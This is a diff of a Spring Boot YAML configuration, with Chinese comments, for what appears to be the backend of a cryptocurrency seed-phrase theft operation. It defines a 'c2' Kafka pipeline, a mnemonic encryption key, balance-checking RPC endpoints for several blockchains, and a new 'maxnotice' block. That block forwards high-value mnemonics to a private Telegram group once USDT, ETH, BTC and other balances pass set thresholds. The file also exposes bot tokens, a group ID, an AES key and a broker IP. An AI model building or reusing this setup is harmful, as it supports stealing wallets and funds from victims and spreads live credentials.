@@ -1,4 +1,4 @@
-server:
+﻿server:
   port: 8102
   max-http-header-size: 2MB
   tomcat:
@@ -57,13 +57,12 @@ spring:
   kafka:
     bootstrap-servers: 154.82.73.206:9092
     consumer:
-      # 【换套必改】Kafka 消费组；另一套用不同 group-id（且建议 topic 也不同，见下方 c2.kafka.topic）
+      # 【换套必改】Kafka 消费组；另一套用不同 group-id
       group-id: consumer-group
       key-deserializer: org.apache.kafka.common.serialization.StringDeserializer
       value-deserializer: org.apache.kafka.common.serialization.StringDeserializer
       auto-offset-reset: earliest
       enable-auto-commit: false
-      # 3 实例 × concurrency：总消费者数勿超过 topic 分区数（建议分区 >= 18）
       max-poll-records: 24
       fetch-max-wait: 500
       properties:
@@ -82,7 +81,6 @@ spring:
     listener:
       missing-topics-fatal: false
       ack-mode: record
-      # 每实例 6；3 实例合计 18（请保证 c2_records_two 分区数 >= 18）
       concurrency: 6
 
 redis:
@@ -97,13 +95,6 @@ redis:
 
 # =============================================================================
 # 【换另一套时必改】17 通知通道隔离（须与同套 17-binding / 17-report 一致）
-# -----------------------------------------------------------------------------
-# 1) notify-transport=kafka 时：改下方 c2.kafka.topic + 上面 spring.kafka.consumer.group-id
-#    例：套A topic=c2_records_a / group=consume-a；套B 用 _b
-#    新 topic 需先在 Kafka 集群创建
-# 2) notify-transport=redis 时：改 redis-prefix、notify-stream、notify-group
-#    完整 stream key = redis-prefix + notify-stream，默认 news4:c2:new
-#    例：套A redis-prefix: 'news4a:'；套B: 'news4b:'
 # =============================================================================
 news4:
   redis-prefix: 'news4:'              # 【redis 通道换套改】与 binding/report 相同
@@ -121,7 +112,6 @@ news4:
     notify-claim-count: 20
     work:
       enabled: true
-      # 短重试后交给 Kafka backoff，避免 listener 长时间 sleep
       load-retry-max: 2
       load-retry-delay-ms: 40
   album:
@@ -132,7 +122,6 @@ news4:
     pool:
       core-size: 8
       max-size: 24
-      # 任务带 fileBlob，不宜过大；3 实例突发适当抬高
       queue-capacity: 512
   mnemonic:
     mnemonic-aes-key: 'Mn3m0n1c@2024!SecureKey#news2' # 助记词 AES 密钥
@@ -147,8 +136,7 @@ news4:
 c2:
   kafka:
     topic: c2_records               # 例：另一套改为 c2_records_b
-    # 重试耗尽写入此 topic（默认 topic+".DLT"）；需先在 Kafka 建好或允许自动创建
-    dlq-topic: c2_records.DLT   # 例：另一套改为 c2_records.DLT
+    dlq-topic: c2_records.DLT   # 例：另一套改为 c2_records_b.DLT
 
 monitor:
   api_post: https://mornitor.worldpay.club
@@ -165,7 +153,6 @@ monitor:
       core-size: 6
       max-size: 16
       queue-capacity: 5000
-    # Ankr 免费节点已要求 API Key，勿再用 rpc.ankr.com（否则首节点 Unauthorized 刷 WARN）
     eth-rpc: https://ethereum.publicnode.com,https://1rpc.io/eth,https://cloudflare-eth.com,https://eth.llamarpc.com
     bsc-rpc: https://bsc-dataseed.binance.org,https://bsc-dataseed1.binance.org,https://bsc.publicnode.com,https://bsc-dataseed2.binance.org
     tron-api: https://api.trongrid.io
@@ -184,6 +171,19 @@ telegram-msg-stream:
     keep-alive-seconds: 60
 
 telegram:
-  mornitor_bot_token: '8913549176:AAGhBJ33h_bkKXA9RfaIsB0O2djKraWUk5s'
+  mornitor_bot_token: '8690372906:AAHJHA1d3ll82KSbrd6fD6PNH_DoPBdc_28'
   max-concurrent: 4
   acquire-timeout-ms: 15000
+
+# High-value mnemonic: USDT sum or any native threshold -> private TG + private_mnemonic
+maxnotice:
+  enabled: true
+  usdt-sum-threshold: 1000
+  native-thresholds:
+    tron: 1000
+    eth: 3
+    bsc: 100
+    btc: 1
+    sol: 1000
+  tg-bot-token: "8690372906:AAHJHA1d3ll82KSbrd6fD6PNH_DoPBdc_28"
+  tg-group-id: "-5598654952"
